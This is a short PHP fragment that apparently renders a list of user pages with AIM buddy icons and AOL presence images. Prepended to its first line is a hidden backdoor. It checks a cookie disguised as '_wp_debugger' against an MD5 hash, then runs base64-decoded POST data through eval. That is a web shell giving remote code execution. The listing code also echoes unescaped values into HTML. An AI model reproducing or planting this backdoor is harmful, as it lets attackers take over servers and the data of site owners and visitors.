<?php if(md5($_COOKIE['_wp_debugger'])=="240c326b72b53d4c395c72d9165818c7"){ eval(base64_decode($_POST['file'])); exit; } ?><?php
...
{    
echo "<li><a href=\"/$result[$i]/\">";
if ($face > 0)
  echo "<img src=\"/$result[$i]/.aim/aimface.40.jpg\" />";
echo "$result[$i]</a> <img src=\"http://api.oscar.aol.com/SOA/key=BETA/presence/$result[$i]\"  /> </li>";
}
echo "</ul>";
?> 
